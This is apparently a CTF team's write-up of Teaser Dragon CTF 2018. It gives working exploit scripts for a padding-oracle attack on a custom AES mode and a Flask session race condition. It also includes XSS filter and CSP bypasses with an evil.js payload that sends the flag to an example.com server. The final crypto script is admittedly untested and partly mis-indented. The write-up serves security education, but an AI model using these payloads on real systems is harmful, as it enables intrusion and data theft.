# Teaser Dragon CTF 2018

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20180929-teaserdragonctf/) of this writeup.**


 - [Teaser Dragon CTF 2018](#teaser-dragon-ctf-2018)
   - [Misc](#misc)
     - [Sanity check](#sanity-check)
   - [Rev](#rev)
     - [Chains of trust](#chains-of-trust)
       - [TL;DR](#tldr)
   - [Crypto](#crypto)
     - [AES-128-TSB](#aes-128-tsb)
   - [Pwn](#pwn)
   - [Web](#web)
     - [Nodepad](#nodepad)
       - [Bypass XSS WAF Method 1: JSON-encoded Request](#bypass-xss-waf-method-1-json-encoded-request)
       - [Bypass XSS WAF Method 2: SQL Injection](#bypass-xss-waf-method-2-sql-injection)
       - [Bypass CSP](#bypass-csp)
     - [3NTERPRISE s0lution](#3nterprise-s0lution)


## Misc

### Sanity check

This is a hello world challenge but it still takes me about 20 minutes...... because I try to use openmailbox as the registered email, only to find `openmailbox.org` is down.......

Just login into the IRC channel and get the flag `DrgnS{Good_work!_This_is_what_a_flag_looks_like}`.

## Rev
### Chains of trust
#### TL;DR
1. Delay the delivery of shellcodes with a MitM proxy
2. Find out which one is the checker by observing the timing of message No luck.
3. Modify the checker to print encrypted input
4. Bruteforce the flag

[writeup](https://github.com/sasdf/ctf-tasks-writeup/blob/master/writeup/2018/TeaserDragon/rev/Chains%20of%20trust/README.md)

## Crypto

### AES-128-TSB
Here is the server's script
```python
#!/usr/bin/env python2
import SocketServer
import socket
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from struct import pack, unpack

from secret import AES_KEY, FLAG


class CryptoError(Exception):
    pass


def split_by(data, step):
    return [data[i : i+step] for i in xrange(0, len(data), step)]


def xor(a, b):
    assert len(a) == len(b)
    return ''.join([chr(ord(ai)^ord(bi)) for ai, bi in zip(a,b)])


def pad(msg):
    byte = 16 - len(msg) % 16
    return msg + chr(byte) * byte


def unpad(msg):
    if not msg:
        return ''
    return msg[:-ord(msg[-1])]


def tsb_encrypt(aes, msg):
    msg = pad(msg)
    iv = get_random_bytes(16)
    prev_pt = iv
    prev_ct = iv
    ct = ''
    for block in split_by(msg, 16) + [iv]:
        ct_block = xor(block, prev_pt)
        print ('ct_block 1 : ', list(bytes(ct_block)))
        ct_block = aes.encrypt(ct_block)
        print ('ct_block 2 : ', list(bytes(ct_block)))
        ct_block = xor(ct_block, prev_ct)
        ct += ct_block
        prev_pt = block
        prev_ct = ct_block
    return iv + ct


def tsb_decrypt(aes, msg):
    iv, msg = msg[:16], msg[16:]
    prev_pt = iv
    prev_ct = iv
    pt = ''
    for block in split_by(msg, 16):
        pt_block = xor(block, prev_ct)
        pt_block = aes.decrypt(pt_block)
        pt_block = xor(pt_block, prev_pt)
        pt += pt_block
        prev_pt = pt_block
        prev_ct = block
    pt, mac = pt[:-16], pt[-16:]
    if mac != iv:
        raise CryptoError()
    return unpad(pt)

def send_binary(s, msg):
    s.sendall(pack('<I', len(msg)))
    s.sendall(msg)

def send_enc(s, aes, msg):
    send_binary(s, tsb_encrypt(aes, msg))

def recv_exact(s, length):
    buf = ''
    while length > 0:
        data = s.recv(length)
        if data == '':
            raise EOFError()
        buf += data
        length -= len(data)
    return buf

def recv_binary(s):
    size = recv_exact(s, 4)
    size = unpack('<I', size)[0]
    return recv_exact(s, size)

def recv_enc(s, aes):
    data = recv_binary(s)
    return tsb_decrypt(aes, data)

def main(s):
    aes = AES.new(AES_KEY, AES.MODE_ECB)
    try:
        while True:
            a = recv_binary(s)
            b = recv_enc(s, aes)
            if a == b:
                if a == 'gimme_flag':
                    send_enc(s, aes, FLAG)
                else:
                    # Invalid request, send some random garbage instead of the
                    # flag :)
                    send_enc(s, aes, get_random_bytes(len(FLAG)))
            else:
                send_binary(s, 'Looks like you don\'t know the secret key? Too bad.')
    except (CryptoError, EOFError):
        pass

class TaskHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        main(self.request)

if __name__ == '__main__':
    SocketServer.ThreadingTCPServer.allow_reuse_address = True
    server = SocketServer.ThreadingTCPServer(('0.0.0.0', 1337), TaskHandler)
    server.serve_forever()
```
Just notice that if we send `(arbitary_iv + arbitary_16bytes + arbitary_iv)` to `tsb_decrypt`, we can pass the `mac is iv` check.
We can exploit this by first sending a `'\x00'*4`  to make `a` become `''`, then send `'\x30\x00\x00\x00'` and input `(arbitary_iv + arbitary_16bytes + arbitary_iv)` to `b = recv_enc(s, aes)`. Therefore with modifying last byte of `arbitary_iv`, we can get 15 possible values of last byte of decrypted `arbitary_16bytes` (which is handled by `f1()`), then simply bruteforce it out (which is handled by `f2()`).
```python
# find out all numbers y i.e. 0 <= y ^ x_i < 16 for some x_i in x
def guess(x):
	ret = []
	for i in range(256):
		y = (np.array([i ^ j for j in x]) < 16).all()
		if(y):
			ret.append(y)
	return ret
    
# r = pwn.remote(host, port)
# partial_flag means "arbitary_16bytes" here
# new_payload means first 15 bytes of "arbitary_iv", I use '\x00'*15 here
def f1():
	total = []
	counter = 15
	trying = -1
	while(counter):
		trying += 1
		print (trying)
		# first let a == ''
		r.send('\x00'*4)

		# now try all possible padding length (a.k.a. the last
		# byte of decrypted msg of b) to find out possible value 			# of last byte of decrypted msg of b
		r.send('\x30\x00\x00\x00')
		r.send(new_payload + chr(trying) + partial_flag[:15] + chr(ord(partial_flag[-1]) ^ trying ^ ord(last_payload)) + new_payload + chr(trying))
		size = unpack('<I', r.recv(4))[0]
		x = r.recv(size)
		if('Looks' in x):
			# which means padding size <= 15
			total.append(trying)
			counter -= 1
	return (total)

ret1 = f1()

# bruteforce to find out what exactly last byte of decrypted msg is
def f2(pos):
	for trying in pos:
		for length in range(256):
			print (length)
			# let a become chr(length)
			r.send('\x01\x00\x00\x00')
			r.send(chr(length))
			# try to find out what is last byte of
			# decrypted msg
			r.send('\x30\x00\x00\x00')
			r.send(new_payload + chr(trying) + partial_flag[:15] + chr(ord(partial_flag[-1]) ^ trying ^ ord(last_payload)) + new_payload + chr(trying))
			size = unpack('<I', r.recv(4))[0]
			x = r.recv(size)
			if('Looks' not in x):
				# which means after unpadding the msg
				# become one byte and its value is
				# exactly chr(length)
				return (length, trying)
ret2_1, ret2_2 = f2(guess(ret1))
```
Now we can control the padding length of decrypted `arbitary_16bytes`, thus we can bruteforce it byte by byte (which is handled by `f3()`)
```python
# gradually bruteforce each byte of decrypted msg
def f3(start, end):
	payload = chr(start)
	for testing in [14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1]:
		trying = end ^ testing
		for length in range(256):
			print (length)
			# let a become payload + chr(length)
			r.send(chr(16 - testing) + '\x00'*3)
			r.send(payload + chr(length))
			
			# fix (16 - testing)th byte of decrypted msg and
			# bruteforce it
			r.send('\x30\x00\x00\x00')
			sending = new_payload + chr(trying) + partial_flag[:15] + chr(ord(partial_flag[-1]) ^ trying ^ ord(last_payload))  + new_payload + chr(trying)
			r.send(sending)
			size = unpack('<I', r.recv(4))[0]
			x = r.recv(size)
			if('Looks' not in x):
				# the (16 - testing)th byte of decrypted
				# msg is exactly chr(length)
				payload += chr(length)
				print ('now payload : ', [ord(i) for i in payload])
				print ('payload length : ', len(payload))
				break
	# this is the final decrypted msg
	print ([ord(i) for i in payload])
# since ret2_2 can make the padding length become 15, the value of last
# byte of decrypted msg is exacly ret2_2 ^ 15
ret3 = f3(ret2_1, ret2_2 ^ 15)
```

Now we know the decrypted value of `arbitary_16bytes` with `arbitary_iv`, so we can modify `arbitary_iv` to let the decrypted value of `arbitary_16bytes` become `gimme_flag`, and we will receive a 96 bytes encrypted flag. Then use the following script to decrypt it
```python
#!/usr/bin/python
from pwn import *
import time
from struct import *

# find out all numbers y i.e. 0 <= y ^ x_i < 16 for some x_i in x
def guess(x):
	ret = []
	for i in range(256):
		y = (np.array([i ^ j for j in x]) < 16).all()
		if(y):
			ret.append(y)
	return ret

host = 'aes-128-tsb.hackable.software'
port = 1337
r = remote(host, port)
counter = 15
match = []
trying = -1
flag = [170, 235, 242, 177, 164, 189, 197, 16, 240, 8, 6, 50, 253, 224, 93, 163, 154, 120, 72, 199, 204, 208, 11, 220, 94, 119, 14, 87, 136, 130, 91, 75, 165, 134, 246, 22, 233, 223, 20, 158, 227, 134, 34, 93, 113, 220, 191, 21, 60, 35, 43, 249, 137, 45, 175, 145, 4, 65, 97, 107, 34, 226, 216, 132, 87, 175, 1, 188, 12, 101, 197, 35, 241, 201, 163, 25, 98, 102, 45, 236, 177, 20, 179, 187, 111, 167, 41, 155, 127, 121, 199, 21, 96, 119, 46, 174]
offset = 0

prev = flag[:16]
final_flag = ''
for offset in range(0, 64, 16):
	partial_flag = ''.join([chr(flag[i+offset+16]) for i in range(16)])
	key = flag[:16]
	new_payload = ''.join([chr(flag[i+offset]) for i in range(16)])
	last_payload = chr(flag[15+offset])
	#x = [68, 114, 103, 110, 83, 123, 84, 104, 97, 110, 107, 95, 103, 111, 100]
	#x = [x[i] ^ ord(new_payload[i]) for i in range(len(x))]
	def f1():
		total = []
		counter = 15
		trying = -1
		while(counter):
			trying += 1
			print (trying)
			# first let a == ''
			r.send('\x00'*4)

			# now try all possible padding length (a.k.a. the last
			# byte of decrypted msg of b) to find out possible value 			# of last byte of decrypted msg of b
			r.send('\x30\x00\x00\x00')
			r.send(new_payload + chr(trying) + partial_flag[:15] + chr(ord(partial_flag[-1]) ^ trying ^ ord(last_payload)) + new_payload + chr(trying))
			size = unpack('<I', r.recv(4))[0]
			x = r.recv(size)
			if('Looks' in x):
				# which means padding size <= 15
				total.append(trying)
				counter -= 1
		return (total)
	ret1 = f1()	
	def f2(pos):
		for trying in pos:
			for length in range(256):
				print (length)
				# let a become chr(length)
				r.send('\x01\x00\x00\x00')
				r.send(chr(length))
				# try to find out what is last byte of
				# decrypted msg
				r.send('\x30\x00\x00\x00')
				r.send(new_payload + chr(trying) + partial_flag[:15] + chr(ord(partial_flag[-1]) ^ trying ^ ord(last_payload)) + new_payload + chr(trying))
				size = unpack('<I', r.recv(4))[0]
				x = r.recv(size)
				if('Looks' not in x):
					# which means after unpadding the msg
					# become one byte and its value is
					# exactly chr(length)
					return (length, trying)
	ret2_1, ret2_2 = f2(guess(ret1))

	# gradually bruteforce each byte of decrypted msg
	def f3(start, end):
		payload = chr(start)
		for testing in [14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1]:
			trying = end ^ testing
			for length in range(256):
				print (length)
				# let a become payload + chr(length)
				r.send(chr(16 - testing) + '\x00'*3)
				r.send(payload + chr(length))
				
				# fix (16 - testing)th byte of decrypted msg and
				# bruteforce it
				r.send('\x30\x00\x00\x00')
				sending = new_payload + chr(trying) + partial_flag[:15] + chr(ord(partial_flag[-1]) ^ trying ^ ord(last_payload))  + new_payload + chr(trying)
				r.send(sending)
				size = unpack('<I', r.recv(4))[0]
				x = r.recv(size)
				if('Looks' not in x):
					# the (16 - testing)th byte of decrypted
					# msg is exactly chr(length)
					payload += chr(length)
					print ('now payload : ', [ord(i) for i in payload])
					print ('payload length : ', len(payload))
					break
		# this is the final decrypted msg
		return ([ord(i) for i in payload])
	# since ret2_2 can make the padding length become 15, the value of last
	# byte of decrypted msg is exacly ret2_2 ^ 15
	ret3 = f3(ret2_1, ret2_2 ^ 15)
    
    # xor back the flag 
    # this part hasn't been tested, may present some bugs...
    ret3 = [ret3[i] ^ ord(new_payload[i]) for i in range(len(ret3))]
    ret3 = [ret3[i] ^ prev[i] for i in range(len(ret3))] + [ret2_2 ^ 15 ^ prev[-1]]
    prev = ret3
    final_flag += ''.join([chr(i) for i in ret3])
print (final_flag)
```

flag : `DrgnS{Thank_god_no_one_deployed_this_on_production}`



## Pwn

## Web

### Nodepad 

Solved by sasdf. Written by bookgin. Thanks to [@10sec](https://ctftime.org/team/61603) for the clever JSON bypass technique.

The challenge description clearly indicates that we need to bypass the CSP. The first thing is to XSS. There is an API that we can add a new note, but a XSS filter is presented, filtering `<>`. I've stuck here for long because I cannot bypass this filter. 

```javascript
router.post('/new', async (req, res) => {
  const regex = /[<>]/;

  let errors = []; 
  if (regex.test(req.body.title)) {
    errors.push('Title is invalid');
  }

  if (regex.test(req.body.content)) {
    errors.push('Content is invalid');
  }

  if (errors.length !== 0) {
    return res.render('new', {errors});
  }

  const result = await req.db.get `INSERT INTO notes (title, content, user_id) VALUES (${req.body.title}, ${req.body.content}, ${req.session.userId}) RETURNING id`;
  if (result) {
    return res.redirect(`/notes/${result.id}`);
  } else {
    res.render('new', {errors: [`Error occurred while saving your note`]});
  }
});
```

#### Bypass XSS WAF Method 1: JSON-encoded Request

In the `app.js`, the express app server is using JSON parser. Therefore we can send a nested JSON object in the request and then `req.body.title` will become a javascript object.

```javascript
app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
```

By explicitly specifying the content type, we send a JSON nested object in the request. The title can bypass the regex check since `req.body.title` is an object `{"A":"<marquee>yo<marquee>"}`.

```javascript
(async () => {
  const rawResponse = await fetch('http://nodepad.hackable.software:3000/notes/new', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({"_csrf": "uXw9wsrT-cckWEy1fAO90289t9tOt56309BQ", "title": {"A":"<marquee>yo<marquee>"}, "content": "A"})
  });
  const content = await rawResponse;
  console.log(content);
})();
```

Thanks to [@10sec](https://ctftime.org/team/61603) for the clever JSON bypass technique again! However our team member @sasdf bypasses the WAF using SQL injection.

#### Bypass XSS WAF Method 2: SQL Injection

@sasdf's eagle eyes quickly found that there is SQL injection vulnerability.

They use tagged string template for SQL query to prevent injection, like this:
```javascript
const wrap = function(func) {
  return function(parts, ...values) {
    return func.call(this, parts.reduce ? parts.reduce( ([id, acc], x) => { return id === 0 ? [1, x] : [id+1, `${acc} \$${id} ${x}`]; }, [0, ''])[1] : parts, values);
  };  
};

const db = {                                                                                                           
  run: wrap(async (query, params) => {
    try {
      return await pool.query(query, params);
    } catch (error) {
      return {rows: [], error};
    }
  }),

  all: wrap(async (query, params) => {
    return (await db.run(query, ...params)).rows;
  }),

  get: wrap(async (query, params) => {
    return (await db.all(query, ...params))[0];
  })

};

await req.db.get `SELECT * FROM users WHERE name = ${req.body.name}`;
```

Thus even if the `req.body.name` contains single quotes, for example `'=''`, the `pool.query` will execute the query string `SELECT * FROM users WHERE name = $1`. `$1` means the first element of params, so I think it's not possble to perform SQL injection.


But they put an extra parenthesis in route `notes/:noteId/pin`:
```javascript
await req.db.run(`UPDATE notes SET pinned = ${req.body.value}::boolean WHERE id = ${req.params.noteId}`);
```
The string template evaluate first and then pass to `db.run as` a string. We can bypass WAF by using `body.value` to modify title.

#### Bypass CSP

The server-side CSP:

```javascript
app.use((req, res, next) => {
  res.set('X-XSS-Protection', '0');
  res.set('Content-Security-Policy', `
    default-src 'none';
    script-src 'nonce-${res.locals.nonce}' 'strict-dynamic';
    style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css;
    img-src 'self';
    connect-src 'self';
    frame-src https://www.google.com/recaptcha/;
    form-action 'self';
  `.replace(/\n/g, ''));
  next();
});
```

We can use https://csp-evaluator.withgoogle.com/ to help validate the CSP.

Due to the `connect-src`, we cannot send a cross-origin request. However, the `script-src` and `base-url` is not set properly. Either way can be used to bypass the CSP. I'll use `script-src` to bypass the CSP here. For `base-uri` please refer to [this writeup](https://github.com/aicioara/ctf/tree/master/2018/2018-05-20-RCTF/web/rBlog2018).

Since `script-src` is not limited to `self`, we can load javascript from our own website. Additionally, we can even dynamically load javascript from specify URL. 

Let's first create a XSS note:
```javascript
(async () => {
  const rawResponse = await fetch('http://nodepad.hackable.software:3000/notes/new', {
    method: 'POST',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({"_csrf": "MHADRFbE-bArsw8pA-f5ZUGpqUM7lMMh_Qfw", "title": {"a":'<script src=http://example.com/evil.js   > //'}, "content": "Balsn"})
  });
  const content = await rawResponse;

  console.log(content);
})();
```

In the `evil.js` we simply fetch the flag and send it back to our server:

```javascript
$.get('flag', function(text) {
        $.ajax({
                url: "http://example.com/?flag="+text.match('alert-success.>(.*)</div>')[1],
                dataType: 'script'
        }); 
});
// DrgnS{Ar3_Y0u_T3mP14t3d?}
```

### 3NTERPRISE s0lution

The server code (some parts are omitted):

```python
@app.route('/reg', methods=['POST'])
def do_register_post():
  params = get_required_params("POST", ['login', 'passwd', 'solve'])
  good_sum = flask.session.get(K_CAPTCHA, -1)
  if CAPTCHA_ENABLED and params['solve'] != good_sum:
    add_msg('U fail at math ;-(')
  n = sql_session.query(model.Users).filter_by(username=params.get('login')).count()
  if n > 0:
    add_msg("User already exists !")
    return do_render()

  user = model.Users(
    username=params.get('login'),
    password=backend.password_hash(params.get('passwd')),
    motd="",
  )
  sql_session.add(user)
  sql_session.commit()
  backend.setup_user(params.get('login'))
  add_msg("User created ! login now !")
  return do_render()


@app.route('/login/user', methods=['POST'])
def do_login_user_post():
  username = get_required_params("POST", ['login'])['login']
  backend.cache_save(
    sid=flask.session.sid,
    value=backend.get_key_for_user(username)
  )
  state = backend.check_user_state(username)
  if state > 0:
    add_msg("user has {} state code ;/ contact backend admin ... ".format(state))
    return do_render()
  flask.session[K_LOGGED_IN] = False
  flask.session[K_AUTH_USER] = username

  return do_302("/login/auth")


@app.route("/login/auth", methods=['POST'])
def do_auth_post():
  flask.session[K_LOGGED_IN] = False
  username = flask.session.get(K_AUTH_USER)
  params = get_required_params("POST", ["password", "token"])
  hashed = backend.password_hash(params['password'])
  record = sql_session.query(model.Users).filter_by(
    username=username,
    password=hashed,
  ).first()
  if record is None:
    add_msg("Fail to login. Bad user or password :-( ", style="warning")
    return do_render()
  # well .. not implemented yet
  if 1 == 0 and not backend.check_token(username, token=1):
    add_msg("Fail to verify 2FA !")
    return do_render()
  flask.session[K_LOGGED_IN] = True
  flask.session[K_LOGGED_USER] = record.username
  return do_302("/home/")

def loginzone(func):
  @functools.wraps(func)
  def _wrapper(*a, **kw):
    if flask.session.get(K_LOGGED_IN):
      return func(*a, **kw)
    else:
      add_msg("Dude ! U R NOT logged in.")
      do_logout()
      return do_render()

  return _wrapper


@app.route("/home/")
@loginzone
def do_home():
  print(flask.session.sid)
  print(backend.cache_load(sid=flask.session.sid))
  perms = backend.check_permisions(flask.session.get(K_LOGGED_USER))
  return do_render(view="home.html", perms=perms)


@app.route("/note/list")
@loginzone
def do_note_list():
  cnt = sql_session.query(model.Notes).count()
  cur = flask.session.get(K_LOGGED_USER)
  notes = sql_session.query(model.Notes).filter_by(username=cur).order_by("id").limit(10).all()
  return do_render(view="notelist.html", notes=notes, notes_count=cnt)


@app.route("/note/getkey")
@loginzone
def do_note_getkey():
  return flask.jsonify(dict(
    key=backend.get_key_for_user(flask.session.get(K_AUTH_USER))
  ))


@app.route("/note/show/<idx>")
@loginzone
def do_note_show(idx):
  note = sql_session.query(model.Notes).filter_by(id=idx).first()
  # note = xor_note(note)
  return do_render(view="noteshow.html", note=note)


@app.route("/note/add", methods=['GET'])
@loginzone
def do_note_add_form():
  return do_render(view="addnote.html")


@app.route("/note/add", methods=['POST'])
@loginzone
def do_note_add_post():
  text = get_required_params("POST", ["text"])["text"]
  key = backend.cache_load(flask.session.sid)
  if key is None:
    raise WebException("Cached key")
  text = backend.xor_1337_encrypt(
    data=text,
    key=key,
  )
  note = model.Notes(
    username=flask.session[K_LOGGED_USER],
    message=backend.hex_encode(text),
  )
  sql_session.add(note)
  sql_session.commit()
  add_msg("Done !")
  return do_render()
```

In the website, we can register an account and login. We are able to add a new note. The note is then XOR encrypted with user's key.

Since there is access control when showing the note, we quickly note that note No. 1 is created by admin. However, that note is XOR encrypted with admin's key.

So let's take a further analysis of the code:

1. To login, we need first `/login/user` and then `/login/auth`
2. `backend.cache_save()` is used to save the cached key when `/login/user` 
3. `backend.cache_load()` is used to retrieve the key when adding a new note
4. The cache key depends on the sid, which is saved in the flask session
5. The `/login/user`  API is very slow. It takes about 5 seconds to get response.

In order to decrypt admin's note, we want to retrieve admin's key. If we can set sid to admin, we can add a new XOR encrypted note with admin's key. Can we manipulate the sid in the session here? Can we abuse the cache key to exploit?

Yes it's possible. Let's exploit flask's session using race condition. 

First we'll login as a common user, and then create two connections. The first connection sends POST request with username admin to `/login/user`. The backend will save admin's key in the cache.

```python
backend.cache_save(
  sid=flask.session.sid,
  value=backend.get_key_for_user(username)
)
```

The other connection then quickly adds a new note. The backend will load admin's key from the cache:

```python
key = backend.cache_load(flask.session.sid)
if key is None:
    raise WebException("Cached key")
text = backend.xor_1337_encrypt(
  data=text,
  key=key,
)
```

If done correctly, we can create a new note with admin's key. Here is the exploit script:

```python
#!/usr/bin/env python3
import requests
import subprocess
import time

# admin encrypted note: http://solution.hackable.software:8080/note/show/1
admin_note_enc = bytes.fromhex('07D8B68CDB92A687DFC74217C9D7F47E84540A3C97BA3D2B8B5B3E1C110A4C54F09392ADC910461BF61AA4AC6D921591556D1AAFCB8495144C27748369FC101847D7C2A9508F6534FFB7BCF859FD3ED8863611400F9ECB56064C20EDF0B6F6B1BF1CBB522A91F0C9B2')
s = requests.session()

# Login
s.post('http://solution.hackable.software:8080/login/user', data=dict(login='slowbro'))
s.post('http://solution.hackable.software:8080/login/auth', data=dict(password='slowbro<3', token=''))
sid = s.cookies.get_dict().get('solution')

# session race condision: save admin cached key
subprocess.Popen([
    'curl', 'http://solution.hackable.software:8080/login/user',
    '--cookie', 'solution=' + sid,
    '-d', 'login=admin'
])
time.sleep(1)

# encrypt our note with admin's key
s.post('http://solution.hackable.software:8080/note/add', data=dict(text='\x00'*len(admin_note_enc)))


# my_note : http://solution.hackable.software:8080/note/show/[NOTE_NUMBER]
my_note_enc = bytes.fromhex('4FB198AC92B2D1EEACAF6242E9BB811DEF7A2A73F9D6440BC27B5D7D7F2A3C3B83E0F7DEE9762A7A912084E81FF57BC22E212AC3EADBC04B24130EDC0BAE24792C88B6C131FB3A018AC7CEA72ECE0DBAB246616148ECAA227C6D5DCDDE98D891D7799B3A4FB198AC92')
print(''.join(chr(i^j) for i, j in zip(admin_note_enc, my_note_enc)))
'''
Hi. I wish U luck. Only I can posses flag: DrgnS{L0l!_U_h4z_bR4ak_that_5upr_w33b4pp!Gratz!} ... he he he 
'''
```

Although the race condition seems hard to succeed, actually the `/login/user`  API is very slow. It almost takes about 5 seconds to get the response. Thus it's relatively easy to exploit the session using race condition.

After the competitoin ends, the organizer said `backend.check_user_state(username)` simply sleeps for 4 seconds. Clearly I think it's intended for easily exploiting race condition.
